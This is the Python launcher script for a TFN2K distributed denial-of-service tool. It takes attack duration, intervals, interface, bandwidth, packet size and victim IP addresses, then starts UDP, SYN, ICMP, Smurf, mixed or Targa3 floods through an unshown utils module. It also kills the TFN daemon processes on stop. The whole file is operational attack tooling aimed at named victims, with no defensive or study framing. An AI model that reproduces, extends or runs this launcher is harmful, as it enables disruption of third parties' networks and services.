import utils
import os
import signal
import re
import sys


mypid = str(os.getpid())
mypidfilename = os.path.dirname(os.path.realpath(__file__)) + os.path.sep + '.pid'    # the file named pid is to store the running processs' pids

def get_interfaces():
    ifaces = os.listdir('/sys/class/net')
    return ifaces

def store_pid():
    with open(mypidfilename, 'a') as f:
        f.writelines(mypid + '\n')

def del_pid():
    try:
        with open(mypidfilename, 'r') as f:
            pids = f.readlines()
    except IOError as e:
        print('Error: ', e)
        exit(1)
    else:
        pids.remove(mypid + '\n')
        with open(mypidfilename, 'w') as f:
            f.writelines(pids)

def judge_legal_ip(one_str):    # judge if the ip is legle ip
    compile_ip=re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
    if compile_ip.match(one_str):
        return True
    else:
        return False

def check_start_args(time_last, attack_interval, wait_interval, phy_interface, bandwidth, packet_size, flood_type, victims):
    try:
        float(time_last)
        float(attack_interval)
        float(wait_interval)
        int(bandwidth)
        int(packet_size)
        int(flood_type)
    except ValueError:
        print('time_last, attack_interval, wait_interval should be \'float\' type and bandwidth, packet_size, flood_type should be \'int\' type.')
        return False
    if int(bandwidth) < -1 or int(bandwidth) == 0:
        print('bandwidth should be -1 or >0!')
        return False
    if int(flood_type) < 1 or int(flood_type) > 6:
        print('flood_type: 1 <= flood_type <= 6')
        return False
    if phy_interface not in get_interfaces():
        print('device %s not found!' % phy_interface)
        return False
    victimlist = victims.split('@')
    for i in victimlist:
        if i == '' or judge_legal_ip(i):
            pass
        else:
            print('victims should be like ip_of_victim1@ip_of_victim2@ip_of_victim3@...')
            return False
    return True

def get_start_args():
    time_last = sys.argv[2]
    attack_interval = sys.argv[3]
    wait_interval = sys.argv[4]
    phy_interface = sys.argv[5]
    bandwidth = sys.argv[6]
    packet_size = sys.argv[7]
    flood_type = sys.argv[8]
    victims = sys.argv[9]
    if check_start_args(time_last, attack_interval, wait_interval, phy_interface, bandwidth, packet_size, flood_type, victims):
        return (time_last, attack_interval, wait_interval, phy_interface, bandwidth, packet_size, flood_type, victims)
    else:
        exit(1)

def start(instance):
    print('Attack start...')
    store_pid()
    instance.start()
    del_pid()
    print('Attack over...')

def stop():
    # stop the tfn2k process
    tfnpids = os.popen('ps aux | grep -E "tfn-daemon|tfn-child" | grep -v grep')
    tfnpids = tfnpids.read().splitlines()
    for i in tfnpids:
        pid = re.search('\d+', i)
        pid = pid.group()
        try:
            os.kill(int(pid), signal.SIGKILL)
        except OSError:
            continue
    # stop the last main process
    try:
        with open(mypidfilename, 'r') as f:
            pids = f.readlines()
    except IOError:
        print('No main process is running!')
    else:
        for pid in pids:
            try:
                os.kill(int(pid), signal.SIGTERM)
            except OSError:
                continue
        os.remove(mypidfilename)
        print('All tfn2k processes are over...')

def help():
    print('Usage:\n\tStart :python main.py start time_last attack_interval wait_interval phy_interface packet_size flood_type victims\n\tStop :python main.py stop\n\tHelp: python main.py help')
    print('Mind!')
    print('bandwidth:\n\t10\t(10Mbps)\n\t100\t(100Mbps)\n\t-1\t(no limit)')
    print('flood_type:\n\t1 - UDP flood\n\t2 - TCP/SYN flood\n\t3 - ICMP/PING flood\n\t4 - ICMP/SMURF\n\t5 - MIX flood\n\t6 - TARGA3 flood')
    print('victims:\n\tip_of_victim1@ip_of_victim2@ip_of_victim3@...')
    exit(1)

if __name__ == '__main__':
    if sys.argv.__len__() == 2:
        if sys.argv[1] == 'stop':
            stop()
        elif sys.argv[1] == 'help':
            help()
        else:
            help()
    elif sys.argv.__len__() == 10:
        if sys.argv[1] == 'start':
            (time_last, attack_interval, wait_interval, phy_interface, bandwidth, packet_size, flood_type, victims) = get_start_args()
            instance = utils.utils(time_last=time_last, attack_interval=attack_interval, wait_interval=wait_interval, phy_interface=phy_interface, bandwidth=bandwidth, packet_size=packet_size, flood_type=flood_type, victims=victims)
            start(instance)
        else:
            help()
    else:
        help()
